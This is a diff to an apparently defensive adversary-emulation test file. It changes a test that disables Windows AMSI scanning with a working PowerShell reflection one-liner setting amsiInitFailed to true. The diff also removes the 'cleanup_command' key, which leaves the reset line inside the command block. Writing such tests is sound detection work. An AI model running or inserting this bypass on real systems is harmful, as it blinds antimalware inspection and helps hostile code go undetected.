@@ -164,7 +164,7 @@ atomic_tests:
 
 - name: AMSI Bypass - AMSI InitFailed
   description: |
-    Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
+    Any easy way to bypass AMSI inspection is to patch its dll in memory by setting the "amsiInitFailed" function to true.
     https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
   supported_platforms:
     - windows
@@ -173,7 +173,6 @@ atomic_tests:
     elevation_required: false
     command: |
       [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-    cleanup_command: |
       [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
 
 - name: AMSI Bypass - Remove AMSI Provider Reg Key
